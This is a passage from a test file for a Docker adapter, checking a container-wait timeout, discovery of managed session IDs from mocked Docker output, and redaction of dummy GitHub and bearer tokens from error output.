          stdout: JSON.stringify([{
            State: { Running: true, ExitCode: 0, Status: 'running' },
          }]),
        }
      );
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      await expect(
        adapter.waitForContainer({
          containerName: `gitview-builder-${VALID_UUID}`,
          timeoutMs: 100,
          pollIntervalMs: 20,
        })
      ).rejects.toThrowError(/did not exit within 100ms/);
    });

    it('listManagedSessionIds: discovers session IDs across managed resources', async () => {
      const mockSpawn = createMockSpawn();
      mockSpawn.onArgs(
        (args) => args[0] === 'ps',
        { exitCode: 0, stdout: `com.gitview.managed=true,com.gitview.session-id=${VALID_UUID}` }
      );
      mockSpawn.onArgs(
        (args) => args[0] === 'network' && args[1] === 'ls',
        { exitCode: 0, stdout: `com.gitview.managed=true,com.gitview.session-id=${OTHER_UUID}` }
      );
      mockSpawn.onArgs(
        (args) => args[0] === 'volume' && args[1] === 'ls',
        { exitCode: 0, stdout: `com.gitview.managed=true,com.gitview.session-id=${VALID_UUID}` }
      );
      const adapter = new DockerAdapter({ spawnFn: mockSpawn });

      const sessionIds = await adapter.listManagedSessionIds();
      expect(sessionIds).toContain(VALID_UUID);
      expect(sessionIds).toContain(OTHER_UUID);
      expect(sessionIds.length).toBe(2);
    });
  });

  describe('Output Sanitization', () => {
    it('redacts sensitive tokens in outputs and errors', () => {
      const sensitive = 'Failed with ghp_123456789012345678901234567890123456 and Bearer secret_preview_token_123';
      const sanitized = sanitizeOutput(sensitive);
      expect(sanitized).not.toContain('ghp_123456789012345678901234567890123456');
      expect(sanitized).not.toContain('secret_preview_token_123');
      expect(sanitized).toContain('[REDACTED_GITHUB_TOKEN]');
      expect(sanitized).toContain('Bearer [REDACTED_BEARER_TOKEN]');
    });
  });
});
